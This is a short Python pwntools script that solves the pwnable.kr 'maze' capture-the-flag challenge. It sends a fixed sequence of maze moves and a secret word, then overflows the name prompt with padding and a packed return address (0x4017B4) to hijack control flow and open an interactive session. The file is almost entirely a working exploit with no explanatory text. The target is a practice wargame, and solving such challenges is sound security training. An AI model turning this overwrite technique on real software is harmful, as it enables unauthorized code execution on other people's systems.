from time import sleep
from pwn import *

exe = ELF("./maze")
context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("pwnable.kr", 9014)
    elif args.DEBUG:
        r = gdb.debug([exe.path])
    else:
        r = process(exe.path)
    return r


def main():
    r = conn()

    pass_level = b'ssdddwwdddssdsssddssddsddsssassd'
    get_to_pos = b'ssdddwwdddssdsssddssddsddsssassaaaaa'
    secret_word = b'OPENSESAMI!'
    end_path = b'ssssaaaaddddwwwwwdddddd'
    r.sendafter("PRESS ANY KEY TO START THE GAME\n", "A")


    for i in range(4):
        r.send(pass_level)
    r.send(get_to_pos)
    r.send(secret_word)
    r.send(end_path)
    r.sendlineafter("name : ", b'kaki'*14 + p64(0x4017B4))

    r.interactive()

if __name__ == "__main__":
    main()
